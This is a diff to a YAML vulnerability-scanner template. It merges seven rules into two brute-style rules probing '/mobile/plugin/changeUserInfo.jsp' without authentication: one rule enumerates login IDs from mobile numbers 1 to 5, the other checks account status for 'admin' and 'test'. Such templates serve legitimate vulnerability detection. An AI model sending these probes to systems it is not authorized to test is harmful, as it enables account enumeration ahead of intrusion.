@@ -15,66 +15,38 @@ info:
 
 rules:
   r0:
+    brute:
+      mode: sniper
+      commit: winner
+      continue: false
+      mobile:
+        - "1"
+        - "2"
+        - "3"
+        - "4"
+        - "5"
     request:
       method: GET
-      path: /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1
+      path: /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile={{mobile}}
     expression: |
       response.status == 200 &&
       response.body.bcontains(b'"loginId":') && 
       response.body.bcontains(b'"status":"1"') &&
       !response.body.bcontains(b'"code":"-1"')
   r1:
+    brute:
+      mode: sniper
+      commit: winner
+      continue: false
+      loginId:
+        - admin
+        - test
     request:
       method: GET
-      path: /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=2
-    expression: |
-      response.status == 200 &&
-      response.body.bcontains(b'"loginId":') && 
-      response.body.bcontains(b'"status":"1"')&&
-      !response.body.bcontains(b'"code":"-1"')
-  r2:
-    request:
-      method: GET
-      path: /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=3
-    expression: |
-      response.status == 200 &&
-      response.body.bcontains(b'"loginId":') && 
-      response.body.bcontains(b'"status":"1"')&&
-      !response.body.bcontains(b'"code":"-1"')
-  r3:
-    request:
-      method: GET
-      path: /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=4
-    expression: |
-      response.status == 200 &&
-      response.body.bcontains(b'"loginId":') && 
-      response.body.bcontains(b'"status":"1"')&&
-      !response.body.bcontains(b'"code":"-1"')
-  r4:
-    request:
-      method: GET
-      path: /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=5
-    expression: |
-      response.status == 200 &&
-      response.body.bcontains(b'"loginId":') && 
-      response.body.bcontains(b'"status":"1"')&&
-      !response.body.bcontains(b'"code":"-1"')
-  r5:
-    request:
-      method: GET
-      path: /mobile/plugin/changeUserInfo.jsp?type=status&loginId=admin
+      path: /mobile/plugin/changeUserInfo.jsp?type=status&loginId={{loginId}}
     expression: |
       response.status == 200 &&
       response.body.bcontains(b'"code":') && 
       response.body.bcontains(b'"status":"1"')&&
       !response.body.bcontains(b'"code":"-1"')
-  r6:
-    request:
-      method: GET
-      path: /mobile/plugin/changeUserInfo.jsp?type=status&loginId=test
-    expression: |
-      response.status == 200 &&
-      response.body.bcontains(b'"code":') && 
-      response.body.bcontains(b'"status":"1"')&&
-      !response.body.bcontains(b'"code":"-1"')
-expression: r0() || r1() || r2() || r3() || r4() || r5() || r6()
+expression: r0() || r1()
